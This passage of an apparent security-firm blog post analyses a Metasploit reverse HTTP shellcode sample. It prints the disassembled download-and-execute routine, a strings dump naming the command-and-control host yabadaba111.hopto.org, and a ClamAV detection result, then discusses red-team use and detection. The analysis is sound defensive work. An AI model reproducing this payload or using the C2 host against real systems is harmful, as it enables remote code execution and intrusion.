0x0000013e   2                     6a1f  push 0x1f
0x00000140   1                       56  push esi
0x00000141   5               6875469e86  push 0x869e4675 ; hash("wininet.dll", "InternetSetOptionA”)
0x00000146   2                     ffd5  call ebp
0x00000148   1                       53  push ebx
0x00000149   1                       53  push ebx
0x0000014a   1                       53  push ebx
0x0000014b   1                       53  push ebx
0x0000014c   1                       56  push esi
0x0000014d   5               682d06187b  push 0x7b18062d ; hash("wininet.dll","HttpSendRequestA")
0x00000152   2                     ffd5  call ebp
0x00000154   2                     85c0  test eax, eax
0x00000156   2                     7508  jnz 0x160
0x00000158   1                       4f  dec edi
0x00000159   2                     75d9  jnz 0x100000134
0x0000015b   5               e852000000  call 0x1b2
0x00000160   2                     6a40  push 0x40
0x00000162   5               6800100000  push 0x1000
0x00000167   5               6800004000  push 0x400000
0x0000016c   1                       53  push ebx
0x0000016d   5               6858a453e5  push 0xe553a458 ; hash("kernel32.dll","VirtualAlloc")
0x00000172   2                     ffd5  call ebp
0x00000174   1                       93  xchg ebx, eax
0x00000175   1                       53  push ebx
0x00000176   1                       53  push ebx
0x00000177   2                     89e7  mov edi, esp
0x00000179   1                       57  push edi
0x0000017a   5               6800200000  push 0x2000
0x0000017f   1                       53  push ebx
0x00000180   1                       56  push esi
0x00000181   5               68129689e2  push 0xe2899612  ; hash("wininet.dll","InternetReadFile")
0x00000186   2                     ffd5  call ebp
0x00000188   2                     85c0  test eax, eax
0x0000018a   2                     74cf  jz 0x10000015b
0x0000018c   2                     8b07  mov eax, [edi]
0x0000018e   2                     01c3  add ebx, eax
0x00000190   2                     85c0  test eax, eax
0x00000192   2                     75e5  jnz 0x100000179
0x00000194   1                       58  pop eax
0x00000195   1                       c3  ret
0x00000196   1                       5f  pop edi
0x00000197   5               e877ffffff  call 0x100000113
0x0000019c   2                     7961  jns 0x1ff
0x0000019e   3                   626164  bound esp, [ecx+0x64]
0x000001a1   1                       61  popad
0x000001a2   3                   626131  bound esp, [ecx+0x31]
0x000001a5   2                     3131  xor [ecx], esi
0x000001a7   6             2e686f70746f  push 0x6f74706f
0x000001ad   2                     2e6f  cs outsd
0x000001af   2                     7267  jb 0x218
0x000001b1   6             00bbf0b5a256  add [ebx+0x56a2b5f0], bh
0x000001b7   2                     6a00  push 0x0
0x000001b9   1                       53  push ebx
0x000001ba   2                     ffd5  call ebp
</pre>
A simple ‘strings’ against the shellcode reveals the target of the reverse http payload. Also at this point ClamAV easily detects that this is a reverse http payload from Metasploit:
<pre>
Strings 
==============
;}$u
D$$[[aYZQ
]hnet
hwiniThLw&
SSSSSh:Vy
SShRZ
/LWbN-ZzFSMsMYg1jVgJfHgOOer2TbTaF7UybWpXZZN-dDUlduKRruzn4hAGXuHoe55oHPw8DiTzbacW3U-eZjbhc
SSSWSVh
VhuF
SSSSVh-
yabadaba111.hopto.org

Clamav 
==============
../../sample.bin.data: Win.Trojan.MSShellcode-7 FOUND
</pre>
yabadaba111.hopto.org does not resolve (at the time of this post)? But hopto.org is part of the No-IP and Dynamic DNS Domain-name network. So this looks like a Team/Actor preparing for a hack-attack?

# Conclusion
While Netscylla still has this payload in the bag for the Red-Team, we’re less inclined to use it, due to the signature being available in so many Anti-Virus and Next-Gen security products. However, this sample is still important for assessing the Blue-Team and their infrastructure-toys ensuring that your SOC can defend against this type of attack.

Also as we can see at the end of our analysis the payload is easier identified by Anti-Virus technologies. No attempt at obfuscation or modifying the payload has been attempted. Maybe the next actor could employ more obfuscation techniques or use a custom C2 in an attempt to evade further detection and simple fingerprinting?

